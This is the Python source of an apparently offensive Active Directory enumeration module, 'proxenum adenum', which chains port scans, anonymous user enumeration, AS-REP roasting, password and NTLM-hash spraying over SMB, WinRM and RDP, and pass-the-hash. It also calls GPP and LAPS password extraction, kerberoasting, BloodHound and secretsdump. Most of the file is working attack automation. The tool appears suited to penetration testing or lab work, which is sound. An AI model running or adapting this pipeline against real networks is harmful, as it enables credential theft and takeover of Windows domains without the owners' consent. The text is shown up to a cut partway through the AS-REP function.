"""Active Directory enumeration mode — proxenum adenum v2.2.0"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
import threading
from datetime import datetime
from pathlib import Path

from rich.console import Console

from .models import CommandRecord, CredentialResult, EnumSession
from .smb import SMB_LINE_RE


# ── helpers ───────────────────────────────────────────────────────────────────

def _find(*names: str) -> str | None:
    for n in names:
        if shutil.which(n):
            return n
    return None


def _wordlist(*paths: str) -> str | None:
    for p in paths:
        if Path(p).exists():
            return p
    return None


def _safe_name(ip: str) -> str:
    return ip.replace(".", "_")


def _merge_list(target: Path, entries: list[str]) -> int:
    """Append unique entries to target file, return count added."""
    seen: set[str] = set()
    existing: list[str] = []
    if target.exists():
        for ln in target.read_text(errors="replace").splitlines():
            ln = ln.strip()
            if ln and ln not in seen:
                existing.append(ln)
                seen.add(ln)
    added = 0
    for e in entries:
        e = e.strip()
        if e and e not in seen:
            existing.append(e)
            seen.add(e)
            added += 1
    target.write_text("\n".join(existing) + ("\n" if existing else ""), encoding="utf-8")
    return added


# nxc output credential line
_NXC_LINE_RE = re.compile(
    r"(SMB|WINRM|RDP|MSSQL|LDAP|SSH|FTP|MYSQL|POSTGRES)\s+(\d+\.\d+\.\d+\.\d+)"
    r"\s+\d+\s+\S+\s+(\[[\+\-\!]\])\s+(\S+)"
)

# nmap port line patterns
_NMAP_NORM_RE = re.compile(r"^\s*(\d+)/tcp\s+open\s+(\S+)")
_NMAP_OG_RE   = re.compile(r"(\d+)/open/tcp//([^/,\s]*)")


# ── credential container ──────────────────────────────────────────────────────

class ADCred:
    """Authentication credential supporting password or NTLM hash (PTH)."""

    def __init__(self, username: str = "", password: str = "",
                 ntlm: str = "", domain: str = "", local_auth: bool = False):
        self.username = username
        self.password = password
        self.ntlm = ntlm
        self.domain = domain
        self.local_auth = local_auth

    @property
    def has_auth(self) -> bool:
        return bool(self.username and (self.password or self.ntlm))

    @property
    def is_pth(self) -> bool:
        return bool(self.ntlm and not self.password)

    def nxc_auth(self, include_local: bool = True) -> list[str]:
        args = ["-u", self.username or ""]
        if self.ntlm and not self.password:
            args += ["-H", self.ntlm]
        else:
            args += ["-p", self.password or ""]
        if self.local_auth and include_local:
            args.append("--local-auth")
        return args

    def display(self) -> str:
        suffix = " (local)" if self.local_auth else ""
        if self.is_pth:
            return f"{self.username} (PTH:{self.ntlm[:8]}...){suffix}"
        if self.username and self.password:
            return f"{self.username}:{self.password}{suffix}"
        return (self.username or "(anonymous)") + suffix

    def impacket_target(self, ip: str) -> str:
        dom = f"{self.domain}/" if self.domain else ""
        if self.is_pth:
            return f"{dom}{self.username}@{ip}"
        return f"'{dom}{self.username}':'{self.password}'@{ip}"


# ── main enumerator ───────────────────────────────────────────────────────────

class ADEnumerator:
    """Orchestrates Active Directory enumeration across an IP set."""

    def __init__(
        self,
        console: Console,
        session: EnumSession,
        ips: list[str],
        usernames: list[str] | None = None,
        passwords: list[str] | None = None,
        ntlms: list[str] | None = None,
        dc_ip: str | None = None,
        domain: str | None = None,
        no_report: bool = False,
        no_brute: bool = False,
        continue_on_success: bool = False,
        local_auth: bool = False,
        do_hydra: bool = False,
        top_ports: int = 0,
        from_json: bool = False,
        persist: bool = True,
    ):
        self.console = console
        self.session = session
        self.ips = ips
        self.usernames: list[str] = list(usernames or [])
        self.passwords: list[str] = list(passwords or [])
        self.ntlms: list[str] = list(ntlms or [])
        self.dc_ip = dc_ip
        self.domain = domain or (
            session.domain if session.domain not in ("Unknown", "") else None
        )
        self.no_report = no_report
        self.no_brute = no_brute
        self.continue_on_success = continue_on_success
        self.local_auth = local_auth
        self.do_hydra = do_hydra
        self.top_ports = top_ports
        self.from_json = from_json
        self.persist = persist

        # Discovered data
        self.users: list[str] = []
        self.asrep_hashes: list[str] = []
        self.kerb_hashes: list[str] = []
        self.laps_passwords: list[tuple[str, str]] = []
        self.valid_creds: list[ADCred] = []
        self.lockout_threshold: int | None = None
        self.pass_pol_text: str = ""

    @property
    def _primary_cred(self) -> ADCred | None:
        """First domain-auth valid cred, or first any valid cred."""
        domain = [c for c in self.valid_creds if not c.local_auth]
        return domain[0] if domain else (self.valid_creds[0] if self.valid_creds else None)

    # ─────────────────────────────────────────── console helpers

    def _h(self, title: str):
        self.console.print(f"\n  [#c9a96e]► {title}[/#c9a96e]")

    def _dim(self, msg: str):
        self.console.print(f"  [dim #8b949e]  {msg}[/dim #8b949e]")

    def _ok(self, msg: str):
        self.console.print(f"  [bold #7aab7a]  ✓ {msg}[/bold #7aab7a]")

    def _warn(self, msg: str):
        self.console.print(f"  [bold #f85149]  ⚠ {msg}[/bold #f85149]")

    # ─────────────────────────────────────────── command runner

    def _run(self, cmd: list[str], label: str, cwd: Path | None = None,
             timeout: int = 120) -> str:
        self.console.print(
            f"  [dim #8b949e]  $ {' '.join(str(x) for x in cmd)[:130]}[/dim #8b949e]"
        )
        output = ""
        rc = -1
        try:
            result = subprocess.run(
                [str(x) for x in cmd], capture_output=True, text=True,
                timeout=timeout, cwd=str(cwd) if cwd else None,
            )
            output = (result.stdout or "") + (result.stderr or "")
            rc = result.returncode
        except subprocess.TimeoutExpired:
            output = "(timeout)"
        except FileNotFoundError:
            output = f"(not found: {cmd[0]})"
        except Exception as e:
            output = f"(error: {e})"
        self.session.command_history.append(CommandRecord(
            command=" ".join(str(x) for x in cmd),
            output=output[:65536],
            return_code=rc,
            duration=0.0,
            label=label,
            timestamp=datetime.now(),
        ))
        return output

    def _done(self, label: str) -> bool:
        return any(r.label == label for r in self.session.command_history)

    def _out(self, label: str) -> str:
        for r in self.session.command_history:
            if r.label == label:
                return r.output
        return ""

    # ─────────────────────────────────────────── directory helpers

    def _host_dir(self, ip: str) -> Path:
        host = self.session.hosts.get(ip)
        name = (host.display_name if host and host.display_name != ip
                else _safe_name(ip))
        d = Path(name)
        d.mkdir(parents=True, exist_ok=True)
        return d

    @staticmethod
    def _safe_user(name: str) -> str:
        """Filesystem-safe directory name for a username (drop domain prefix)."""
        name = name.replace("\\", "/").split("/")[-1]  # DOMAIN\user → user
        safe = re.sub(r"[^A-Za-z0-9._@-]", "_", name).strip("_")
        return safe or "user"

    def _user_dir(self, cred: "ADCred") -> Path:
        """Per-user output directory: collected artifacts (BloodHound JSON,
        ldapdomaindump) land under <username>/ so they never scatter or clobber
        another user's loot. e.g. <username>/adenum/, <username>/ldapbooks/."""
        d = Path(self._safe_user(cred.username))
        d.mkdir(parents=True, exist_ok=True)
        return d

    # ─────────────────────────────────────────── main pipeline

    def run(self):
        # Phase 1: Port scan all IPs (reuse session data if available)
        self._h("Port Discovery")
        for ip in self.ips:
            self._scan_ports(ip)
        self.save_report()

        # Phase 1b: SMB host info — signing/OS/domain/hostname for the inventory
        # (also populates relay candidates and auto-detects the domain)
        self._h("SMB Host Info")
        self._enum_smb_hostinfo()
        self.save_report()

        # DC / Domain detection
        if not self.dc_ip:
            self.dc_ip = self._detect_dc()
        if self.dc_ip:
            self._ok(f"DC: {self.dc_ip}")
        else:
            self.dc_ip = self.ips[0] if self.ips else None
            self.console.print("  [yellow]  No DC detected — targeting first IP[/yellow]")
        if not self.domain:
            self.domain = self._detect_domain()
        if self.domain:
            self.session.domain = self.domain
            self._dim(f"Domain: {self.domain}")

        # Phase 2: Anonymous user enumeration + password policy
        self._h("User Enumeration (anonymous)")
        self._enum_users_anon()
        self._enum_pass_pol(None)

        # Phase 3: AS-REP Roasting (no creds needed)
        if self.users:
            self._h("AS-REP Roasting")
            self._asrep_roast()
            self.save_report()

        # Phase 4: Credential spray (if user/pass/hash lists provided)
        if self.from_json:
            self._dim("--from-json: skipping spray — reusing valid creds from proxenum.json")
        elif self.usernames and (self.passwords or self.ntlms):
            self._h("Credential Spray")
            self._lockout_guard()
            self._credential_spray()
            self.save_report()
        elif self.usernames:
            self._dim("Username(s) provided but no passwords/hashes — skipping spray")

        # Populate valid_creds from session.credentials if spray found nothing
        # (also picks up pre-existing creds loaded from proxenum.json)
        if not self.valid_creds:
            self._load_valid_creds_from_session()

        # Phase 5: Full service enumeration per IP (focus-style)
        self._h("Service Enumeration (per-port)")
        for ip in self.ips:
            self._service_enum_ip(ip)
        self.save_report()

        # Phase 6: Authenticated AD operations (using primary valid cred)
        pcred = self._primary_cred
        if pcred:
            self._h(f"Authenticated AD Enumeration ({pcred.display()})")
            self._enum_users_auth(pcred)
            self._dedup_users()
            self._write_users_txt()
            self._enum_pass_pol(pcred)
            self.save_report()

            self._h("GPP / Autologin Passwords")
            self._run_gpp(pcred)

            self._h("LAPS")
            self._run_laps(pcred)

            self._h("Kerberoasting")
            self._kerberoast(pcred)
            self.save_report()

            self._h("ldapdomaindump")
            self._run_ldapdomaindump(pcred)
            self.save_report()

            self._h("BloodHound Collection")
            self._run_bloodhound(pcred)
            self.save_report()

            self._h("secretsdump")
            self._run_secretsdump(pcred)
            self.save_report()
        else:
            self._dim("No valid credentials — skipping authenticated phases")
            self._write_users_txt()

        # Phase 7: SMB share enumeration (per valid user)
        if self.valid_creds:
            self._h("SMB Shares (authenticated)")
            self._smb_shares_auth()

        # Phase 8: Protocol auth matrix (valid creds × all IPs × open ports)
        if self.valid_creds:
            self._h("Protocol Auth Matrix")
            self._auth_matrix()
            self.save_report()

        # Phase 9: Hydra brute force (opt-in with --brute)
        if self.do_hydra and self.usernames and (self.passwords or self.ntlms):
            self._h("Hydra Brute Force")
            self._run_hydra()
            self.save_report()

        self.save_report()

    # ─────────────────────────────────────────── port scan

    def _scan_ports(self, ip: str):
        """TCP port discovery.
        Priority:
          1. Ports already in session (loaded from db) → nmap -sCV detail only
          2. --top-ports N explicitly set → fast top-N scan
          3. Default → rustscan + nmap -p- in parallel, then nmap -sCV detail
        """
        host = self.session.hosts.get(ip)

        # ── 0. --from-json: never scan; rely solely on loaded ports ───────────
        if self.from_json:
            if host and host.open_ports:
                self._ok(
                    f"{ip}: {len(host.open_ports)} port(s) (from json): "
                    f"{', '.join(str(p) for p in sorted(host.open_ports))[:80]}"
                )
            else:
                self._warn(f"{ip}: no ports in proxenum.json — run adenum/drill first")
            return

        # ── 1. Session already has ports ──────────────────────────────────────
        if host and host.open_ports:
            lbl_detail = f"Nmap detail {ip}"
            if not self._done(lbl_detail):
                port_str = ",".join(str(p) for p in sorted(host.open_ports))
                out = self._run(
                    ["sudo", "nmap", "-sCV", "-Pn", f"-p{port_str}", ip],
                    label=lbl_detail, timeout=300,
                )
                for line in out.splitlines():
                    m = _NMAP_NORM_RE.match(line)
                    if m:
                        host.open_ports[int(m.group(1))] = m.group(2)
                    for m2 in _NMAP_OG_RE.finditer(line):
                        host.open_ports.setdefault(int(m2.group(1)), m2.group(2) or "unknown")
            self._ok(
                f"{ip}: {len(host.open_ports)} port(s) (loaded): "
                f"{', '.join(str(p) for p in sorted(host.open_ports))[:80]}"
            )
            return

        # ── 2. Fast mode: --top-ports explicitly requested ────────────────────
        if self.top_ports:
            lbl = f"Nmap scan {ip}"
            if self._done(lbl):
                self._parse_nmap_ports(ip, self._out(lbl))
                return
            n = self.top_ports
            self._dim(f"Scanning {ip} (top {n} ports)…")
            out = self._run(
                ["sudo", "nmap", "-sCV", "-Pn", "--top-ports", str(n),
                 "--open", "-oG", "-", ip],
                label=lbl, timeout=300,
            )
            self._parse_nmap_ports(ip, out)
            return

        # ── 3. Full scan: rustscan + nmap -p- parallel, then nmap -sCV detail ─
        rust_lbl = f"rustscan {ip}"
        nmap_full_lbl = f"nmap -p- {ip}"
        host2 = self.session.get_or_create_host(ip)
        ports: set[int] = set()

        if self._done(rust_lbl) or self._done(nmap_full_lbl):
            # Parallel scan already recorded — rebuild from session
            ports = set(host2.open_ports.keys())
        else:
            self._dim(f"Full port scan {ip} (rustscan + nmap -p- parallel)…")
            ports = self._parallel_full_scan(ip, rust_lbl, nmap_full_lbl)
            if not ports:
                self._dim(f"{ip}: no open TCP ports found")
                return
            for p in ports:
                host2.open_ports.setdefault(p, "unknown")

        # nmap -sCV detail to populate service names / OS info
        lbl_detail = f"Nmap detail {ip}"
        if not self._done(lbl_detail):
            port_str = ",".join(str(p) for p in sorted(ports))
            out = self._run(
                ["sudo", "nmap", "-sCV", "-Pn", f"-p{port_str}", ip],
                label=lbl_detail, timeout=300,
            )
            for line in out.splitlines():
                m = _NMAP_NORM_RE.match(line)
                if m:
                    host2.open_ports[int(m.group(1))] = m.group(2)
                for m2 in _NMAP_OG_RE.finditer(line):
                    host2.open_ports.setdefault(int(m2.group(1)), m2.group(2) or "unknown")
        if host2.open_ports:
            self._ok(
                f"{ip}: {len(host2.open_ports)} port(s): "
                f"{', '.join(str(p) for p in sorted(host2.open_ports))[:80]}"
            )

    def _parallel_full_scan(self, ip: str, rust_lbl: str, nmap_lbl: str) -> set[int]:
        """Run rustscan + nmap -p- in parallel; record results; return union of open ports."""
        ports: set[int] = set()
        rust_buf: list[tuple[str, int]] = []
        nmap_buf: list[tuple[str, int]] = []

        rust_cmd = ["rustscan", "-a", ip, "--ulimit", "5000", "-b", "1000"]
        nmap_cmd = ["sudo", "nmap", "-p-", "--min-rate", "1000", "-T4",
                    "-Pn", "--open", "-oG", "-", ip]

        self.console.print(
            f"  [dim #8b949e]  ❯ {' '.join(rust_cmd)}  [parallel][/dim #8b949e]"
        )
        self.console.print(
            f"  [dim #8b949e]  ❯ {' '.join(nmap_cmd)}[/dim #8b949e]"
        )

        def _run_rust():
            try:
                r = subprocess.run(rust_cmd, capture_output=True, text=True, timeout=120)
                rust_buf.append((r.stdout + r.stderr, r.returncode))
            except Exception as ex:
                rust_buf.append((f"(error: {ex})", -1))

        def _run_nmap():
            try:
                r = subprocess.run(nmap_cmd, capture_output=True, text=True, timeout=600)
                nmap_buf.append((r.stdout, r.returncode))
            except Exception as ex:
                nmap_buf.append((f"(error: {ex})", -1))

        t1 = threading.Thread(target=_run_rust, daemon=True)
        t2 = threading.Thread(target=_run_nmap, daemon=True)
        t1.start(); t2.start()
        t1.join(timeout=130)
        t2.join(timeout=610)

        # Record + parse rustscan
        raw_rust, rc_rust = rust_buf[0] if rust_buf else ("", -1)
        self.session.command_history.append(CommandRecord(
            command=" ".join(rust_cmd),
            output=raw_rust[:65536],
            return_code=rc_rust,
            duration=0.0,
            label=rust_lbl,
            timestamp=datetime.now(),
        ))
        for m in re.finditer(r"Open\s+\d+\.\d+\.\d+\.\d+:(\d+)", raw_rust):
            ports.add(int(m.group(1)))
        if not ports:
            for m in re.finditer(r"\d+\.\d+\.\d+\.\d+\s*->\s*\[([^\]]+)\]", raw_rust):
                for p in m.group(1).split(","):
                    p = p.strip()
                    if p.isdigit():
                        ports.add(int(p))

        # Record + parse nmap -p-
        raw_nmap, rc_nmap = nmap_buf[0] if nmap_buf else ("", -1)
        self.session.command_history.append(CommandRecord(
            command=" ".join(nmap_cmd),
            output=raw_nmap[:65536],
            return_code=rc_nmap,
            duration=0.0,
            label=nmap_lbl,
            timestamp=datetime.now(),
        ))
        for m in _NMAP_OG_RE.finditer(raw_nmap):
            ports.add(int(m.group(1)))

        if ports:
            self._ok(
                f"{ip}: {len(ports)} port(s) discovered: "
                f"{', '.join(str(p) for p in sorted(ports))[:80]}"
            )
        return ports

    def _parse_nmap_ports(self, ip: str, output: str):
        host = self.session.get_or_create_host(ip)
        for line in output.splitlines():
            m = _NMAP_NORM_RE.match(line)
            if m:
                host.open_ports[int(m.group(1))] = m.group(2)
            for m2 in _NMAP_OG_RE.finditer(line):
                host.open_ports.setdefault(int(m2.group(1)), m2.group(2) or "unknown")
        if host.open_ports:
            self._ok(
                f"{ip}: {len(host.open_ports)} port(s): "
                f"{', '.join(str(p) for p in sorted(host.open_ports))[:80]}"
            )
        else:
            self._dim(f"{ip}: no open ports detected")

    # ─────────────────────────────────────────── DC / domain detection

    def _detect_dc(self) -> str | None:
        for ip in self.ips:
            host = self.session.hosts.get(ip)
            if host:
                pts = set(host.open_ports)
                hn = (host.hostname or "").lower()
                fq = (host.fqdn or "").lower()
                # Classic: Kerberos + LDAP
                if 88 in pts and (389 in pts or 636 in pts):
                    return ip
                # Global Catalog ports (3268/3269) + any LDAP = definitely DC
                # even if Kerberos port 88 is filtered
                if (3268 in pts or 3269 in pts) and (389 in pts or 636 in pts):
                    return ip
                # GC alone is strong indicator
                if 3268 in pts or 3269 in pts:
                    return ip
                # DNS + LDAP = likely DC
                if 53 in pts and (389 in pts or 636 in pts):
                    return ip
                # Hostname pattern
                if re.search(r"\bdc\d*\b", hn) or re.search(r"\bdc\d*\.", fq):
                    return ip
        return None

    def _detect_domain(self) -> str | None:
        for ip in self.ips:
            host = self.session.hosts.get(ip)
            if not host:
                continue
            if host.domain not in ("Unknown", "", None):
                return host.domain
            if host.fqdn and "." in host.fqdn and host.fqdn != "Unknown":
                parts = host.fqdn.split(".")
                if len(parts) >= 2:
                    return ".".join(parts[-2:])
        return None

    def _dc_fqdn(self) -> str:
        if not self.dc_ip:
            return ""
        host = self.session.hosts.get(self.dc_ip)
        if host and host.fqdn not in ("Unknown", "", None):
            return host.fqdn
        if self.domain:
            hn = (host.hostname if host and host.hostname not in ("Unknown", "") else "dc01")
            return f"{hn}.{self.domain}"
        return self.dc_ip

    # ─────────────────────────────────────────── SMB host info

    def _enum_smb_hostinfo(self):
        """Run `nxc smb <ip>` to populate hostname/OS/domain/signing for the inventory."""
        if not _find("nxc"):
            self._dim("nxc not found — skipping host info")
            return
        targets = [
            ip for ip in self.ips
            if self.session.hosts.get(ip)
            and (set(self.session.hosts[ip].open_ports) & {139, 445})
        ]
        if not targets:
            self._dim("No SMB (139/445) hosts — skipping host info")
            return
        for ip in targets:
            lbl = f"nxc smb host-info {ip}"
            if not self._done(lbl):
                self._run(["nxc", "smb", ip], label=lbl, timeout=30)
            self._parse_smb_hostinfo(self._out(lbl))
        relay = [
            ip for ip in targets
            if self.session.hosts.get(ip) and self.session.hosts[ip].relay_candidate
        ]
        if relay:
            self._warn(f"SMB signing OFF (relay candidate): {', '.join(relay)}")
        else:
            self._dim("Host info collected")

    def _parse_smb_hostinfo(self, output: str):
        for line in output.splitlines():
            m = SMB_LINE_RE.search(line)
            if not m:
                continue
            mip, os_info, hostname, domain, signing, smbv1 = m.groups()
            host = self.session.get_or_create_host(mip)
            host.hostname = hostname
            if domain.lower() != hostname.lower():
                host.fqdn = f"{hostname}.{domain}".lower()
            else:
                host.fqdn = hostname.lower()
            host.domain = domain
            host.os_info = os_info
            host.smb_signing = signing.lower() == "true"
            host.smbv1 = smbv1.lower() == "true"
            if "." in domain and (
                self.session.domain in ("Unknown", "")
                or "." not in (self.session.domain or "")
            ):
                self.session.domain = domain
                if not self.domain:
                    self.domain = domain

    # ─────────────────────────────────────────── password policy

    def _enum_pass_pol(self, cred: "ADCred | None"):
        """Query domain password policy — surfaces lockout threshold before spraying."""
        dc = self.dc_ip or (self.ips[0] if self.ips else None)
        if not dc or not _find("nxc"):
            return
        if cred and cred.has_auth:
            lbl = f"nxc pass-pol (auth) {dc}"
            args = cred.nxc_auth(include_local=False)
        else:
            lbl = f"nxc pass-pol (anon) {dc}"
            args = ["-u", "", "-p", ""]
        if not self._done(lbl):
            self._run(["nxc", "smb", dc] + args + ["--pass-pol"], label=lbl, timeout=30)
        self._parse_pass_pol(self._out(lbl))

    def _parse_pass_pol(self, output: str):
        if not output.strip():
            return
        keep: list[str] = []
        for ln in output.splitlines():
            low = ln.lower()
            if any(k in low for k in (
                "minimum password length", "password history length",
                "lockout threshold", "lockout duration", "lockout observation",
                "password complexity", "maximum password age", "minimum password age",
            )):
                cleaned = re.sub(r"^\s*SMB\s+\S+\s+\d+\s+\S+\s+", "", ln).strip()
                if cleaned:
                    keep.append(cleaned)
            m = re.search(r"[Ll]ockout\s*[Tt]hreshold\s*:?\s*(\d+)", ln)
            if m:
                self.lockout_threshold = int(m.group(1))
        if keep:
            self.pass_pol_text = "\n".join(keep)
        if self.lockout_threshold is not None:
            if self.lockout_threshold == 0:
                self._ok("Account lockout threshold: None (0) — safe to spray")
            else:
                self._warn(
                    f"Account lockout threshold: {self.lockout_threshold} "
                    f"— limit attempts per account to avoid lockout"
                )

    def _lockout_guard(self):
        """Warn if the planned spray could lock accounts given the policy threshold."""
        n_secrets = len(self.passwords) + len(self.ntlms)
        thr = self.lockout_threshold
        if thr and thr > 0 and n_secrets >= thr and not self.continue_on_success:
            self._warn(
                f"⚠ Spraying {n_secrets} secret(s) but lockout threshold is {thr}. "
                f"Lockout risk — consider --no-brute and 1 password per round."
            )

    # ─────────────────────────────────────────── GPP / autologin passwords

    def _run_gpp(self, cred: "ADCred"):
        """Search SYSVOL for GPP cpassword and autologin credentials."""
        dc = self.dc_ip
        if not dc or not cred.has_auth or not _find("nxc"):
            return
        for mod in ("gpp_password", "gpp_autologin"):
            lbl = f"nxc {mod} {dc}"
            if not self._done(lbl):
                self._run(
                    ["nxc", "smb", dc] + cred.nxc_auth(include_local=False) + ["-M", mod],
                    label=lbl, timeout=60,
                )
            out = self._out(lbl)
            for m in re.finditer(r"(?i)\b(?:password|usernames?)\s*:\s*(\S+)", out):
                val = m.group(1).strip()
                if val and val.lower() not in ("none", "[notfound]", "[]"):
                    self._warn(f"GPP {mod}: {val}")

    # ─────────────────────────────────────────── anonymous user enum

    def _enum_users_anon(self):
        dc = self.dc_ip
        if not dc:
            return

        if _find("rpcclient"):
            for creds_str in ["%", "guest%"]:
                lbl = f"rpcclient enumdomusers ({creds_str}) {dc}"
                if not self._done(lbl):
                    self._run(
                        ["rpcclient", "-U", creds_str, "-N", dc, "-c", "enumdomusers"],
                        label=lbl, timeout=20,
                    )
                self._parse_rpcclient_users(self._out(lbl))
            if self.users:
                lbl = f"rpcclient enumdomgroups {dc}"
                if not self._done(lbl):
                    self._run(
                        ["rpcclient", "-U", "%", "-N", dc, "-c", "enumdomgroups"],
                        label=lbl, timeout=20,
                    )

        if _find("nxc"):
            for user, pw in [("", ""), ("guest", "")]:
                lbl = f"nxc smb rid-brute ({user!r}) {dc}"
                if not self._done(lbl):
                    self._run(
                        ["nxc", "smb", dc, "-u", user, "-p", pw, "--rid-brute"],
                        label=lbl, timeout=90,
                    )
                self._parse_nxc_rid(self._out(lbl))

            for user, pw in [("", ""), ("guest", "")]:
                lbl = f"nxc ldap users-anon ({user!r}) {dc}"
                if not self._done(lbl):
                    self._run(
                        ["nxc", "ldap", dc, "-u", user, "-p", pw, "--users"],
                        label=lbl, timeout=60,
                    )
                self._parse_nxc_ldap_users(self._out(lbl))

        self._dedup_users()
        if self.users:
            self._ok(f"{len(self.users)} user(s) found anonymously")
        else:
            self._dim("No users found via anonymous access")

    # ─────────────────────────────────────────── authenticated user enum

    def _enum_users_auth(self, cred: ADCred):
        dc = self.dc_ip
        if not dc:
            return
        dom_args = ["--domain", self.domain] if self.domain else []

        lbl = f"nxc smb users (auth) {dc}"
        if not self._done(lbl):
            self._run(
                ["nxc", "smb", dc] + cred.nxc_auth(include_local=False) + ["--users"],
                label=lbl, timeout=60,
            )
        self._parse_nxc_users_auth(self._out(lbl))

        lbl = f"nxc ldap users (auth) {dc}"
        if not self._done(lbl):
            self._run(
                ["nxc", "ldap", dc] + cred.nxc_auth(include_local=False) +
                dom_args + ["--users"],
                label=lbl, timeout=60,
            )
        self._parse_nxc_ldap_users(self._out(lbl))

        if _find("rpcclient") and not cred.is_pth:
            dom = (self.domain + "\\") if self.domain else ""
            cred_str = f"{dom}{cred.username}%{cred.password}"
            for cmd_name in ("enumdomusers", "enumdomgroups", "getdompwinfo"):
                lbl = f"rpcclient {cmd_name} {dc}"
                if not self._done(lbl):
                    self._run(
                        ["rpcclient", "-U", cred_str, dc, "-c", cmd_name],
                        label=lbl, timeout=20,
                    )
            self._parse_rpcclient_users(self._out(f"rpcclient enumdomusers {dc}"))

    # ─────────────────────────────────────────── credential spray

    def _credential_spray(self):
        """Spray user/pass/hash lists against all IPs via SMB/WinRM/RDP (domain + local)."""
        tmps: list[str] = []

        def _tmp(values: list[str]) -> str:
            if len(values) == 1:
                return values[0]
            f = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
            f.write("\n".join(values))
            f.close()
            tmps.append(f.name)
            return f.name

        try:
            ip_target   = _tmp(self.ips)
            user_target = _tmp(self.usernames)

            # Password spray
            if self.passwords:
                pass_target = _tmp(self.passwords)
                for proto in ("smb", "winrm", "rdp"):
                    la_opts = [False, True] if self.local_auth else [False]
                    for la in la_opts:
                        tag = " (local)" if la else ""
                        lbl = f"{proto.upper()} spray{tag}"
                        if not self._done(lbl):
                            cmd = ["nxc", proto, ip_target,
                                   "-u", user_target, "-p", pass_target]
                            if self.no_brute:
                                cmd.append("--no-brute")
                            if self.continue_on_success:
                                cmd.append("--continue-on-success")
                            if la:
                                cmd.append("--local-auth")
                            self._run(cmd, label=lbl, timeout=300)
                        self._parse_spray(self._out(lbl), is_ntlm=False, local_auth=la)

            # NTLM hash spray
            if self.ntlms:
                hash_target = _tmp(self.ntlms)
                for proto in ("smb", "winrm", "rdp"):
                    la_opts = [False, True] if self.local_auth else [False]
                    for la in la_opts:
                        tag = " (local)" if la else ""
                        lbl = f"{proto.upper()} hash spray{tag}"
                        if not self._done(lbl):
                            cmd = ["nxc", proto, ip_target,
                                   "-u", user_target, "-H", hash_target]
                            if self.continue_on_success:
                                cmd.append("--continue-on-success")
                            if la:
                                cmd.append("--local-auth")
                            self._run(cmd, label=lbl, timeout=300)
                        self._parse_spray(self._out(lbl), is_ntlm=True, local_auth=la)

        finally:
            for f in tmps:
                try:
                    os.unlink(f)
                except OSError:
                    pass

        # Build valid_creds from successful session.credentials
        self._load_valid_creds_from_session()

        if self.valid_creds:
            self._ok(f"{len(self.valid_creds)} valid credential(s)")
            for c in self.valid_creds[:6]:
                self.console.print(f"    [#7aab7a]  {c.display()}[/#7aab7a]")
        else:
            self._dim("No valid credentials found in spray")

    def _parse_spray(self, output: str, is_ntlm: bool, local_auth: bool):
        # Dedup to avoid adding the same result twice on resume
        existing = {
            (cr.username, cr.password, cr.ip, cr.protocol, cr.local_auth)
            for cr in self.session.credentials
        }
        for line in output.splitlines():
            m = _NXC_LINE_RE.search(line)
            if not m:
                continue
            proto, ip, status, cred_token = m.groups()
            user_pass = cred_token
            if "\\" in cred_token:
                user_pass = cred_token.split("\\", 1)[1]
            elif "/" in cred_token and ":" in cred_token.split("/", 1)[1]:
                user_pass = cred_token.split("/", 1)[1]
            if ":" not in user_pass:
                continue
            user, secret = user_pass.split(":", 1)
            success = "+" in status
            is_admin = "Pwn3d!" in line or "(Pwn3d!)" in line
            key = (user, secret, ip, proto, local_auth)
            if key in existing:
                continue
            existing.add(key)
            self.session.credentials.append(CredentialResult(
                username=user,
                password=secret,
                ip=ip,
                protocol=proto,
                success=success,
                is_admin=is_admin,
                is_ntlm=is_ntlm,
                local_auth=local_auth,
            ))

    def _load_valid_creds_from_session(self):
        """Populate valid_creds from session.credentials (dedup by user+secret)."""
        seen: set[tuple] = set()
        for cr in self.session.credentials:
            if not cr.success:
                continue
            secret = cr.password
            key = (cr.username, secret, cr.local_auth)
            if key in seen:
                continue
            seen.add(key)
            self.valid_creds.append(ADCred(
                username=cr.username,
                password="" if cr.is_ntlm else secret,
                ntlm=secret if cr.is_ntlm else "",
                domain=self.domain or "",
                local_auth=cr.local_auth,
            ))

    def _unique_creds(self) -> list[ADCred]:
        """Deduplicated credentials by (user, secret) — removes per-IP duplicates."""
        seen: set[tuple] = set()
        result: list[ADCred] = []
        for c in self.valid_creds:
            key = (c.username, c.password or c.ntlm, c.local_auth)
            if key not in seen:
                seen.add(key)
                result.append(c)
        return result

    # ─────────────────────────────────────────── service enum per IP

    def _service_enum_ip(self, ip: str):
        """Run focus-style service enumeration for a single IP using known ports."""
        from .focus import FocusEnumerator
        host = self.session.hosts.get(ip)
        if not host or not host.open_ports:
            self._dim(f"{ip}: no open ports — skipping service enum")
            return
        self.console.print(
            f"\n  [dim #8b949e]  ↳ {ip} "
            f"[{', '.join(str(p) for p in sorted(host.open_ports))[:60]}][/dim #8b949e]"
        )
        # no_report=True prevents FocusEnumerator from writing focus.html;
        # we manually set out_dir for nmap file saving.
        fe = FocusEnumerator(self.console, self.session, ip, no_report=True)
        disp = (host.display_name if host.display_name != ip else ip.replace(".", "_"))
        fe.out_dir = Path(disp)
        (fe.out_dir / "nmap").mkdir(parents=True, exist_ok=True)
        fe.skip_searchsploit = True  # suppress searchsploit noise — AD context

        port_str = ",".join(str(p) for p in sorted(host.open_ports))
        fe._scan_vuln(port_str)
        fe._scan_udp()
        fe._enum_snmp()

        # Exclude AD-specific ports — handled by dedicated adenum phases.
        # Also exclude 593 (RPC over HTTP) and 5985/5986 (WinRM) which nmap
        # reports as "http" but running feroxbuster/davtest against them is useless.
        ad_only_ports = {88, 389, 464, 593, 636, 3268, 3269, 5985, 5986, 47001}
        dispatch_ports = set(host.open_ports.keys()) - ad_only_ports
        fe._dispatch(dispatch_ports)

    # ─────────────────────────────────────────── AS-REP Roasting

    def _asrep_roast(self):
        dc = self.dc_ip
        if not dc or not self.users:
            return
        if not _find("impacket-GetNPUsers"):
            self._dim("impacket-GetNPUsers not found — skipping AS-REP Roasting")
            return

        users_tmp = Path("_adenum_asrep_users.tmp")
        users_tmp.write_text("\n".join(self.users), encoding="utf-8")
        dom = self.domain or "."
        lbl = f"GetNPUsers {dc}"
        if not self._done(lbl):
            self._run([
                "impacket-GetNPUsers", f"{dom}/",
                "-dc-ip", dc,
                "-usersfile", str(users_tmp),
                "-no-pass", "-format", "hashcat",
            ], label=lbl, timeout=90)
        users_tmp.unlink(missing_ok=True)

        out = self._out(lbl)
        self.asrep_hashes = [ln.strip() for ln in out.splitlines()
                             if ln.strip().startswith("$krb5asrep$")]
        if self.asrep_hashes:
            hf = Path("asrep.hash")
